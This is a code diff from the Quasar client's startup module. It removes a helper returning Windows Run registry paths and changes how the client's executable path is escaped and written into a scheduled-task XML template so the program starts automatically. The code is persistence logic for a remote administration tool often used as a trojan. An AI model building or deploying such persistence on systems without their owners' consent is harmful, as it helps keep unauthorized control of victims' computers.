@@ -14,14 +14,6 @@ namespace Quasar.Client.Setup
 {
     public class ClientStartup : ClientSetupBase
     {
-        private string GetHKLMPath()
-        {
-            if (!PlatformHelper.Is64Bit)
-            {
-                return "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
-            }
-            return "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run";
-        }
         public void AddToStartup(string executablePath, string startupName)
         {
 
@@ -36,7 +28,10 @@ namespace Quasar.Client.Setup
                 {
                     string xmlContent = Encoding.UTF8.GetString(Resource1.options);
 
-                    xmlContent = xmlContent.Replace("notepad.exe", executablePath);
+                    string escapedExecutablePath = executablePath.Replace("&", "&amp;").Replace("<", "&lt;").Replace(">", "&gt;");
+
+                    xmlContent = xmlContent.Replace("<Command>notepad.exe</Command>",
+                        $"<Command>{escapedExecutablePath}</Command>\n<WorkingDirectory>{Path.GetDirectoryName(executablePath)}</WorkingDirectory>");
 
                     File.WriteAllText(xmlPath, xmlContent, new UTF8Encoding(encoderShouldEmitUTF8Identifier: false));
                 }
